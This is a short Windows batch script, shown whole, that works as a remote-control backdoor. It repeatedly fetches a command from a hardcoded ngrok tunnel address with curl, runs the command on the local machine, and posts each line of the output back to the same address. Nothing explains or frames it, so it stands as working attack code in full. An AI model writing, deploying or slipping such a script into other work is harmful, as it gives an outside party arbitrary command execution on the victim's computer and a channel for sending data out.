@echo off
set URL=https://noneconomical-trisha-waitingly.ngrok-free.dev

:loop
    ping -n 1 127.0.0.1 >nul
    
    curl -s %URL% > cmd.txt 2>nul
    set /p CMD=<cmd.txt
    
    if "%CMD%"=="" goto loop
    
    for /f "delims=" %%O in ('%CMD% 2^>^&1') do (
        echo %%O > output.txt
        curl -X POST --data-binary @output.txt %URL% 2>nul
    )
    
    goto loop
